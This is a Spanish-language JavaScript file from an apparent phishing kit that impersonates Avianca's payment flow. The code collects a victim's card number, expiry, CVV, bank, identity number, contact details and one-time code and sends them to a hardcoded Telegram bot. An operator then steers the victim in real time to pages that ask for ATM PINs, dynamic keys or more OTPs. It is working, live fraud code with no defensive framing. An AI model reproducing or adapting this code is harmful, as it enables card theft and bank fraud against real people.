// CONFIGURACIÓN DIRECTA (modifica estos valores con los tuyos reales)
const BOT_TOKEN = "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y";
const CHAT_ID = "-4644294739";

// Script principal
document.addEventListener("DOMContentLoaded", () => {
    const btnNextStep = document.getElementById("btnNextStep");

    if (!btnNextStep) {
        console.error("❌ No se encontró el botón Verificar.");
        return;
    }

    btnNextStep.addEventListener("click", async (event) => {
        event.preventDefault();

        const otpInput = document.getElementById("otp");
        if (!otpInput) {
            console.error("❌ No se encontró el campo OTP.");
            return;
        }

        const otp = otpInput.value.trim();
        if (!otp) {
            alert("Por favor, ingresa el código OTP.");
            return;
        }

        console.log("✅ Código OTP ingresado:", otp);

        const pagoData = localStorage.getItem("pagoavianca");
        if (!pagoData) {
            console.warn("⚠️ No se encontraron datos en localStorage para pagoavianca.");
            return;
        }

        let pagoavianca;
        try {
            pagoavianca = JSON.parse(pagoData);
        } catch (error) {
            console.error("❌ Error al parsear pagoavianca:", error);
            return;
        }

        const transactionId = Date.now().toString();
        const mensaje = `✈️ <b>Avianca</b> ✈️\n💳 Tarjeta: <code>${pagoavianca.card}</code>\n🗓️ Fecha: <code>${pagoavianca.card_date}</code>\n💳 CCV: <code>${pagoavianca.ccv}</code>\n🏦 Banco: <code>${pagoavianca.bank}</code>\n📅 Cuotas: <code>${pagoavianca.cuotas}</code>\n👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>\n👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>\n💳 CC: <code>${pagoavianca.cc}</code>\n📨 Correo: <code>${pagoavianca.email}</code>\n📲 Teléfono: <code>${pagoavianca.phone}</code>\n🏙️ Ciudad: <code>${pagoavianca.city}</code>\n🗽 Provincia: <code>${pagoavianca.state}</code>\n🧭 Dirección: <code>${pagoavianca.address}</code>\n🔑 OTP: <code>${otp}</code>`;

        const keyboard = {
            inline_keyboard: [
                [{ text: "X Logo", callback_data: `error_logo:${transactionId}` }],
                [{ text: "X TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Dinámica", callback_data: `dinamic:${transactionId}` }],
                [{ text: "OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Clave Cajero", callback_data: `cajero:${transactionId}` }],
                [{ text: "X Dinamica", callback_data: `xdinamic:${transactionId}` }],
                [{ text: "X OTP", callback_data: `xotp:${transactionId}` }],
                [{ text: "Fin", callback_data: `confirm_finalizar:${transactionId}` }]
            ]
        };

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: "HTML",
                    reply_markup: keyboard
                })
            });

            const data = await response.json();

            if (data.ok) {
                console.log("✅ Mensaje enviado a Telegram:", data);
                const messageId = data.result.message_id;
                checkPaymentVerification(transactionId, messageId);
            } else {
                console.error("❌ Error al enviar mensaje a Telegram:", data);
            }
        } catch (error) {
            console.error("❌ Error en fetch de sendMessage:", error);
        }
    });
});

// Función de verificación en Telegram
async function checkPaymentVerification(transactionId, messageId) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
        const data = await response.json();

        const updates = data.result;
        const verificationUpdate = updates.find((update) =>
            update.callback_query &&
            [
                `error_tc:${transactionId}`,
                `error_logo:${transactionId}`,
                `dinamic:${transactionId}`,
                `pedir_otp:${transactionId}`,
                `cajero:${transactionId}`,
                `xdinamic:${transactionId}`,
                `xotp:${transactionId}`,
                `confirm_finalizar:${transactionId}`
            ].includes(update.callback_query.data)
        );

        if (verificationUpdate) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: messageId,
                    reply_markup: { inline_keyboard: [] }
                })
            });

            switch (verificationUpdate.callback_query.data) {
                case `error_logo:${transactionId}`:
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "id-check.html";
                    break;
                case `error_tc:${transactionId}`:
                    alert('Corrige el método de pago. Código: AVERR88000023');
                    window.location.href = "payment.html";
                    break;
                case `pedir_otp:${transactionId}`:
                    window.location.href = "otpcode.html";
                    break;
                case `dinamic:${transactionId}`:
                    window.location.href = "pedirdinamica.html";
                    break;
                case `cajero:${transactionId}`:
                    window.location.href = "clavecajero.html";
                    break;
                case `xdinamic:${transactionId}`:
                    alert('Error en la clave dinámica, inténtelo nuevamente.');
                    window.location.href = "errordinamica.html";
                    break;
                case `xotp:${transactionId}`:
                    alert('Código OTP incorrecto, intenta nuevamente.');
                    window.location.href = "errorotp.html";
                    break;
                case `confirm_finalizar:${transactionId}`:
                    window.location.href = "success.html";
                    break;
            }
        } else {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
    } catch (error) {
        console.error("❌ Error verificando respuesta de Telegram:", error);
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }

    localStorage.setItem("transactionId", transactionId);
    localStorage.setItem("messageId", messageId);

    setTimeout(() => {
        console.log("🔄 Redirigiendo a waiting.html...");
        window.location.href = "waiting.html";
    }, 500);
}
